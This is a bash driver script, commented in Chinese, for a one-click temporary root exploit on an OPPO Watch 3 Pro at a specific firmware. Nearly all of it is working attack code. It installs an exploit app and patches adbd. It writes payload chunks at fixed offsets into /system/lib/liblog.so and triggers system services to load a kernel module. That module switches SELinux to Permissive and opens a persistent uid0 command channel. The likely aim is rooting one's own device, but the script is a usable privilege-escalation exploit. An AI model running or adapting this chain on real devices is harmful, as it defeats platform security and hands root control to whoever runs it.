#!/usr/bin/env bash
# =============================================================================
# run.sh —— OWW211 (OPPO Watch 3 Pro / A.142 / 5.4.134-00522) 一键临时 root
#   目标: SELinux Permissive + uid0 常驻通道
#   用法:
#     SERIAL=<设备序列号> ./run.sh          # 指定设备
#     ./run.sh -s <序列号>                  # 同上
#     ./run.sh                              # 仅当只连接一台设备时自动选
#   可选环境变量:
#     ADB=adb            adb 路径
#     FORCE=1            固件指纹不匹配时仍继续(有风险, 偏移是按 A.142 量的)
#   说明: 重启后全部失效(内核态), 重跑本脚本即可再次获得.
# =============================================================================
set -uo pipefail
DIR_RAW="$(cd "$(dirname "$0")" && pwd)"
if command -v cygpath >/dev/null 2>&1; then DIR="$(cygpath -m "$DIR_RAW")"; else DIR="$DIR_RAW"; fi
ASSETS="$DIR/assets"
ADB="${ADB:-adb}"
SERIAL="${SERIAL:-}"
export MSYS2_ARG_CONV_EXCL="*"

say(){ printf '%s\n' "$*"; }
die(){ printf '[x] %s\n' "$*" >&2; exit 1; }

# ---------- 0. 参数 ----------
while [ $# -gt 0 ]; do
  case "$1" in
    -s|--serial) SERIAL="${2:-}"; shift 2;;
    -h|--help) sed -n '2,16p' "$0"; exit 0;;
    *) die "未知参数: $1";;
  esac
done

command -v "$ADB" >/dev/null 2>&1 || die "找不到 adb（可设 ADB=/path/to/adb）"

# ---------- 1. 选设备 ----------
if [ -z "$SERIAL" ]; then
  mapfile -t DEVS < <("$ADB" devices | awk 'NR>1 && $2=="device"{print $1}')
  [ "${#DEVS[@]}" -eq 1 ] || {
    say "[!] 当前连接设备:"
    "$ADB" devices -l | sed 's/^/    /'
    die "请用 SERIAL=<序列号> ./run.sh 指定目标设备"
  }
  SERIAL="${DEVS[0]}"
fi
sh_(){ timeout 40 "$ADB" -s "$SERIAL" shell "$@" 2>&1 | tr -d '\r'; }
alb(){ "$ADB" -s "$SERIAL" "$@" >/dev/null 2>&1; }

say "[1/7] 目标设备 $SERIAL"
[ "$("$ADB" -s "$SERIAL" get-state 2>/dev/null)" = "device" ] || die "设备不在线/未授权"

# ---------- 2. 固件指纹 ----------
BUILD="$(sh_ getprop ro.build.display.id)"
KVER="$(sh_ cat /proc/version)"
say "      build=$BUILD"
say "      kernel=$KVER"
if ! printf '%s' "$BUILD" | grep -q 'OWW211_11_A.142' || ! printf '%s' "$KVER" | grep -q '5.4.134-perf-00522'; then
  [ "${FORCE:-0}" = "1" ] || die "固件/内核不匹配（偏移按 OWW211_11_A.142 / 5.4.134-00522 量取）。确认风险后可 FORCE=1 重试"
  say "     [!] FORCE=1：继续，但可能失败或崩溃"
fi
[ "$(sh_ getprop sys.boot_completed)" = "1" ] || die "系统尚未启动完成"
# 载荷已生效时禁止重写: 第二次相同写入会覆盖正在执行的钩子, 实测会导致 adbd/USB 失联
if [ "$(sh_ getenforce)" = "Permissive" ] && sh_ 'grep -q dfselperm /proc/modules'; then
  die "设备上已有生效的载荷（Permissive + dfselperm）。重复写入会破坏正在执行的钩子并导致 USB 失联；
     请先重启手表，或直接复用现有通道（.dfr/ready）。"
fi
UPT="$(sh_ "awk '{print int(\$1)}' /proc/uptime")"
[ "${UPT:-0}" -ge 30 ] || die "刚启动(${UPT}s)，请等 1 分钟再试"

# ---------- 3. 安装 DF app（签名固定, 已内置）----------
APP=/data/local/tmp/_dfroot_app.apk
NEED=0
sh_ "pm path com.ghost.exploit" | grep -q '^package:' || NEED=1
if [ "$NEED" = "1" ] || [ "${REINSTALL:-0}" = "1" ]; then
  say "[2/7] 安装 DF app"
  "$ADB" -s "$SERIAL" install --no-streaming -r -d "$ASSETS/dfroot.apk" 2>&1 | tail -1 | sed 's/^/      /'
else
  say "[2/7] DF app 已安装"
fi

# ---------- 4. 推送资产 ----------
say "[3/7] 推送资产（含防误跑保险 _t271_nop2）"
sh_ 'touch /data/local/tmp/_t271_nop2; am force-stop com.ghost.exploit' >/dev/null
want=$(md5sum "$ASSETS/m.img" | awk '{print $1}')
"$ADB" -s "$SERIAL" push "$ASSETS/m.img" /sdcard/m.img >/dev/null 2>&1 || die "镜像推送失败"
got=$(sh_ 'md5sum /sdcard/m.img' | awk '{print $1}')
[ "$want" = "$got" ] || die "镜像 md5 不一致: $want / $got"
"$ADB" -s "$SERIAL" push "$ASSETS/r.sh" /data/local/tmp/r.sh >/dev/null 2>&1
"$ADB" -s "$SERIAL" shell 'rm -rf /data/local/tmp/_zy_blk; mkdir -p /data/local/tmp/_zy_blk; rm -rf /data/local/tmp/.dfr' >/dev/null 2>&1
"$ADB" -s "$SERIAL" push "$ASSETS/blocks/." /data/local/tmp/_zy_blk/ >/dev/null 2>&1
printf '\x50\x00\x00\x00' > "$DIR/.ci80"
"$ADB" -s "$SERIAL" push "$DIR/.ci80" /data/local/tmp/_chunk_idx >/dev/null 2>&1
sh_ 'chmod 666 /data/local/tmp/r.sh /data/local/tmp/_zy_blk/* /data/local/tmp/_chunk_idx' >/dev/null
say "      m.img md5=$got  blocks=$(sh_ 'ls /data/local/tmp/_zy_blk|wc -l')  r.sh 已推送"

# ---------- 5. 分两段写载荷（ci=80：只写块、不触发）----------
write_list(){ # $1=起始块号 $2=结束块号(含) $3=是否含 h1 $4=是否含 h3
  local f="$DIR/.list.txt"
  : > "$f"
  [ "${4:-0}" = "1" ] && printf '0x9600 /system/lib/liblog.so h3\n' >> "$f"
  printf '0x97fc /system/lib/liblog.so s00\n' >> "$f"
  printf '0x980c /system/lib/liblog.so s01\n' >> "$f"
  printf '0x981c /system/lib/liblog.so s02\n' >> "$f"
  printf '0x982c /system/lib/liblog.so s03\n' >> "$f"
  printf '0x983c /system/lib/liblog.so s04\n' >> "$f"
  printf '0x984c /system/lib/liblog.so s05\n' >> "$f"
  local k
  for k in $(seq "$1" "$2"); do
    printf '0x%x /system/lib/liblog.so p%02d\n' $((0x9604 + k*16)) "$k" >> "$f"
  done
  [ "${3:-0}" = "1" ] && printf '0x3f64 /system/lib/liblog.so h1\n' >> "$f"
  "$ADB" -s "$SERIAL" push "$f" /data/local/tmp/_zy_writes.txt >/dev/null 2>&1
  sh_ 'chmod 666 /data/local/tmp/_zy_writes.txt' >/dev/null
}
wait_app(){ # 等 app 完成清单写
  local i
  for i in $(seq 1 60); do
    local L; L=$(sh_ 'tail -1 /sdcard/Android/data/com.ghost.exploit/files/t056.log 2>/dev/null')
    case "$L" in *notrig*|*"t292 done"*) return 0;; esac
    sleep 4
  done
  return 1
}
start_app(){
  sh_ 'rm -f /data/local/tmp/_t271_nop2; am force-stop com.ghost.exploit' >/dev/null
  sh_ 'rm -f /sdcard/Android/data/com.ghost.exploit/files/t056.log' >/dev/null
  "$ADB" -s "$SERIAL" shell am start -n com.ghost.exploit/.MainActivity >/dev/null 2>&1
}

# 确保 bind mount 的源存在（补丁版 adbd）
if [ -z "$(sh_ 'test -f /data/local/tmp/adbd_root && echo 1')" ]; then
  if [ -f "$DIR/tools/adbd_root" ]; then
    "$ADB" -s "$SERIAL" push "$DIR/tools/adbd_root" /data/local/tmp/adbd_root >/dev/null 2>&1
  else
    TT="$(cygpath -m /tmp 2>/dev/null || echo /tmp)/adbd.orig.$$"
  "$ADB" -s "$SERIAL" pull /apex/com.android.adbd/bin/adbd "$TT" >/dev/null 2>&1 && mv -f "$TT" "$DIR/.adbd.orig"
    "${PYTHON:-python}" "$DIR/tools/patch_adbd.py" "$DIR/.adbd.orig" >/dev/null 2>&1 || die "adbd 补丁失败（指纹不符）"
    "$ADB" -s "$SERIAL" push "$DIR/.adbd.orig" /data/local/tmp/adbd_root >/dev/null 2>&1
    rm -f "$DIR/.adbd.orig"
  fi
  sh_ 'chmod 755 /data/local/tmp/adbd_root' >/dev/null
fi

say "[4/7] 写入载荷 第 1/2 段（h3 + p00..p17）"
write_list 0 17 0 1
start_app; wait_app || die "第 1 段写入超时（看 /sdcard/Android/data/com.ghost.exploit/files/t056.log）"
say "[5/7] 写入载荷 第 2/2 段（p18..p27 + h1 激活）"
write_list 18 27 1 0
start_app; wait_app || die "第 2 段写入超时"
say "      $(sh_ 'tail -1 /sdcard/Android/data/com.ghost.exploit/files/t056.log')"

# ---------- 6. 触发 ----------
sh_ 'rm -rf /data/local/tmp/.dfr' >/dev/null 2>&1
say "[6/7] 触发（vold 绑 loop → init 挂载+拉起 uid0 → HAL 加载模块）"
sh_ 'sm idle-maint run' >/dev/null 2>&1; sleep 1
sh_ 'sm fstrim' >/dev/null 2>&1; sleep 2
sh_ 'for k in $(seq 0 20); do setprop debug.z$k 1; done' >/dev/null 2>&1; sleep 1
# ★ installd 主动打日志：钩子门控匹配 /system/bin/i* 的 cmdline[12]，
#   init(mount OK/execve 被 Enforcing 拒) 与 installd(execve 放行) 都会命中；
#   3 次调用预算内必须让 installd 拿到一拍，r.sh 才能以 installd 域落地。
sh_ 'cmd package compile --quicken -f com.android.settings' >/dev/null 2>&1 &
sh_ 'cmd package compile --quicken -f com.android.systemui' >/dev/null 2>&1 &
sleep 4
sh_ 'svc wifi disable' >/dev/null 2>&1; sleep 1
sh_ 'svc wifi enable'  >/dev/null 2>&1; sleep 3
sh_ 'svc wifi enable'  >/dev/null 2>&1; sleep 2

# ---------- 7. 验证 ----------
say "[7/7] 验证"
ENF=$(sh_ getenforce)
MOD=$(sh_ 'cat /proc/modules | grep dfselperm')
say "      getenforce = $ENF"
say "      module     = ${MOD:-<未加载>}"
READY=""
for i in $(seq 1 20); do
  READY=$(sh_ 'cat /data/local/tmp/.dfr/ready 2>/dev/null')
  [ -n "$READY" ] && break
  sleep 2
done
IDU=""
if [ -n "$READY" ]; then
  sh_ "echo 'id -u; getenforce' > /data/local/tmp/.dfr/cmd" >/dev/null 2>&1
  for i in $(seq 1 10); do
    OUT=$(sh_ 'cat /data/local/tmp/.dfr/out 2>/dev/null')
    printf '%s' "$OUT" | grep -q -- '--- rc=' && break
    sleep 1
  done
  IDU=$(printf '%s' "$OUT" | head -1 | tr -d '[:space:]')
fi
if [ "$ENF" = "Permissive" ] && printf '%s' "$READY" | grep -q 'uid=0' && [ "$IDU" = "0" ]; then
  say ""
  say "=============================================="
  say " ✅ 临时 root 成功: Permissive + uid0"
  say "=============================================="
  printf '%s\n' "$READY" | sed 's/^/   /'
  sh_ "echo 'id -u; getenforce' > /data/local/tmp/.dfr/cmd" >/dev/null
  sleep 3
  say "   通道复验: $(sh_ 'cat /data/local/tmp/.dfr/out 2>/dev/null' | tr '\n' ' ')"
  say ""
  say " 用法: ./cmd.sh 'id; ls /data/data | head'"
  say " 重启后失效；重跑 ./run.sh 即可。"
  exit 0
fi

say ""
say "[x] 未达成。诊断信息:"
say "  getenforce=$ENF  module=${MOD:-无}"
say "  挂载: $(sh_ 'mount | grep mediacas')"
say "  内核模块错误:"
sh_ 'logcat -b kernel -d 2>/dev/null | grep -iE "dfselperm|PLT|vermagic|symbol version" | tail -6' | sed 's/^/    /'
say "  载荷上报 tag: $(sh_ 'logcat -d -v brief 2>/dev/null | awk "{print \$1}" | grep -E "^[A-Z]/[0-9A-Fa-f]{4}$" | sort | uniq -c | tail -3' | tr '\n' ' ')"
say "  常见原因: 页面窗口错过(过慢) / 固件不匹配 / init 未打日志 → 重跑一次通常可解。"
exit 1
